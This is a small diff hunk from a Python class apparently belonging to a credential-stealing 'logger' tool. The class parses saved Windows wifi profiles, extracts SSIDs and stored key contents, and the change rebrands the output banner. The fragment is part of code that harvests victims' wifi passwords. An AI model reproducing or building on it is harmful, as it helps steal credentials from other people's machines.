@@ -89,7 +89,7 @@ class Mac10:
                         security_key = re.findall(r"(?:Security key\s*:\s)(.*)", current_result)
                         password = re.findall("(?:Key Content\s*:\s)(.*)", current_result)
                         
-                        self.passwords += f"------------MAC10 Logger | .gg/kos | security------------"
+                        self.passwords += f"------------Cloak | .gg/kos | security / Vealloll------------"
                         self.passwords += f"\n\nSSID           : {ssid[0]}"
                         self.passwords += f"Authentication : {authentication[0]}"
                         self.passwords += f"Cipher         : {cipher[0]}"
